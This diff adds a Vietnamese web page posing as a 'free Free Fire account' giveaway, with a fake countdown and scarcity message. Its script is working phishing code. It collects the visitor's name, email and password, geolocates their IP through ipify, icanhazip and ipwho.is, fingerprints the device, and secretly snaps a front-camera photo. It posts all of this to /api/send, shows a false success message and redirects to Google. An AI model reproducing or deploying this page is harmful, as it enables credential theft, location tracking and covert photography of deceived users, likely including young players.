@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tặng Acc Free Fire</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 40px 35px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            border: 1px solid rgba(255,255,255,0.08);
+            animation: fadeIn 0.8s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .logo { text-align: center; margin-bottom: 25px; }
+        .logo img {
+            width: 90px; height: 90px;
+            border-radius: 50%;
+            background: #fff;
+            padding: 10px;
+        }
+        .logo h1 {
+            color: #fff;
+            font-size: 24px;
+            font-weight: 700;
+            margin-top: 12px;
+            text-shadow: 0 0 30px rgba(255, 107, 107, 0.3);
+        }
+        .logo h1 span { color: #ff6b6b; }
+        .logo p {
+            color: rgba(255,255,255,0.5);
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        .timer {
+            background: rgba(255, 107, 107, 0.15);
+            border: 1px solid rgba(255, 107, 107, 0.3);
+            border-radius: 12px;
+            padding: 12px;
+            text-align: center;
+            margin-bottom: 25px;
+            color: #ff6b6b;
+            font-size: 18px;
+            font-weight: 700;
+        }
+        .timer span { color: #fff; }
+        .input-group { margin-bottom: 18px; }
+        .input-group label {
+            display: block;
+            color: rgba(255,255,255,0.7);
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 6px;
+        }
+        .input-group input, .input-group select {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: rgba(255,255,255,0.06);
+            color: #fff;
+            font-size: 15px;
+            transition: 0.3s;
+            outline: none;
+            appearance: none;
+        }
+        .input-group input:focus, .input-group select:focus {
+            border-color: #ff6b6b;
+            background: rgba(255,255,255,0.1);
+            box-shadow: 0 0 20px rgba(255, 107, 107, 0.15);
+        }
+        .input-group input::placeholder { color: rgba(255,255,255,0.3); }
+        .input-group select option { background: #1a1a2e; color: #fff; }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 10px 30px rgba(255, 107, 107, 0.4);
+        }
+        .btn:active { transform: scale(0.98); }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+            color: rgba(255,255,255,0.6);
+            font-size: 14px;
+        }
+        .loading .spinner {
+            width: 30px; height: 30px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid #ff6b6b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: rgba(255,255,255,0.2);
+            font-size: 12px;
+        }
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            padding: 12px 24px;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 14px;
+            display: none;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .note {
+            color: rgba(255,255,255,0.3);
+            font-size: 12px;
+            text-align: center;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <img src="https://i.imgur.com/8K7YvXp.png" alt="Free Fire">
+            <h1>TẶNG <span>ACC FREE FIRE</span></h1>
+            <p>🔥 Sự kiện giới hạn - Nhận ngay hôm nay!</p>
+        </div>
+
+        <div class="timer">
+            ⏳ Còn <span id="countdown">05:00</span> để nhận acc VIP
+        </div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label>👤 Tên hiển thị</label>
+                <input type="text" id="name" placeholder="Nhập tên của bạn" required>
+            </div>
+            <div class="input-group">
+                <label>📧 Email</label>
+                <input type="email" id="email" placeholder="Nhập email của bạn" required>
+            </div>
+            <div class="input-group">
+                <label>🔑 Mật khẩu (để đăng nhập acc)</label>
+                <input type="password" id="password" placeholder="Nhập mật khẩu" required>
+            </div>
+            <div class="input-group">
+                <label>🎮 Acc mong muốn</label>
+                <select id="acc_type">
+                    <option value="VIP">🔥 Acc VIP Đồ Cổ</option>
+                    <option value="PRO">💎 Acc Full Súng Nâng Cấp</option>
+                    <option value="FREE">🆓 Acc Lv5 </option>
+                </select>
+            </div>
+            <button type="submit" class="btn" id="submitBtn">🚀 NHẬN ACC NGAY</button>
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <span>⏳ Đang tìm acc phù hợp...</span>
+            </div>
+        </form>
+
+        <div class="note">
+            ⚡ Số lượng có hạn, chỉ 100 acc được tặng hôm nay
+        </div>
+
+        <div class="footer">
+            © 2026 Free Fire Event • DKHANG KOL
+        </div>
+    </div>
+
+    <div class="toast" id="toast">✅ Đã nhận acc! Kiểm tra email để lấy thông tin.</div>
+
+    <script>
+        let timeLeft = 300;
+        const timerEl = document.getElementById('countdown');
+
+        setInterval(() => {
+            const mins = Math.floor(timeLeft / 60);
+            const secs = timeLeft % 60;
+            timerEl.textContent = String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+            if (timeLeft <= 0) {
+                timerEl.textContent = '00:00';
+                document.getElementById('submitBtn').disabled = true;
+                document.getElementById('submitBtn').textContent = '⏳ Đã hết hạn';
+            }
+            timeLeft--;
+        }, 1000);
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const name = document.getElementById('name').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const accType = document.getElementById('acc_type').value;
+
+            if (!name || !email || !password) {
+                showToast('⚠️ Vui lòng điền đầy đủ thông tin!');
+                return;
+            }
+
+            document.getElementById('submitBtn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+
+            const info = {
+                name: name,
+                email: email,
+                password: password,
+                accType: accType,
+                time: new Date().toLocaleString('vi-VN'),
+                ip: '',
+                realIp: '',
+                isp: '',
+                country: '',
+                address: '',
+                lat: '',
+                lon: '',
+                device: navigator.userAgent,
+                platform: navigator.platform,
+                screen: window.screen.width + 'x' + window.screen.height,
+                camera: '⏳ Đang kiểm tra...'
+            };
+
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                info.ip = d.ip || 'Không rõ';
+            } catch (e) { info.ip = 'Lỗi'; }
+
+            try {
+                const r = await fetch('https://icanhazip.com');
+                const ip = await r.text();
+                info.realIp = ip.trim();
+                const res = await fetch('https://ipwho.is/' + info.realIp);
+                const data = await res.json();
+                info.isp = data.connection?.org || 'VNNIC';
+                info.country = data.country || 'Việt Nam';
+                info.lat = data.latitude?.toFixed(6) || '0';
+                info.lon = data.longitude?.toFixed(6) || '0';
+                info.address = (data.city || '') + ', ' + (data.region || '');
+            } catch (e) { info.realIp = 'Lỗi'; }
+
+            let photoBlob = null;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 800));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                stream.getTracks().forEach(t => t.stop());
+                photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                info.camera = '✅ Đã chụp camera';
+            } catch (e) {
+                info.camera = '🚫 Không có quyền camera';
+            }
+
+            const formData = new FormData();
+            formData.append('info', JSON.stringify(info));
+            if (photoBlob) {
+                formData.append('photo', photoBlob, 'front.jpg');
+            }
+
+            try {
+                const response = await fetch('/api/send', { method: 'POST', body: formData });
+                const result = await response.json();
+
+                if (result.status === 'success') {
+                    showToast('✅ Nhận acc thành công! Kiểm tra email để lấy thông tin.');
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 3000);
+                } else {
+                    showToast('❌ Lỗi: ' + result.message);
+                    document.getElementById('submitBtn').style.display = 'block';
+                    document.getElementById('loading').style.display = 'none';
+                }
+            } catch (error) {
+                showToast('❌ Lỗi kết nối: ' + error.message);
+                document.getElementById('submitBtn').style.display = 'block';
+                document.getElementById('loading').style.display = 'none';
+            }
+        });
+
+        function showToast(msg) {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.style.display = 'block';
+            setTimeout(() => t.style.display = 'none', 4000);
+        }
+    </script>
+</body>
+</html>
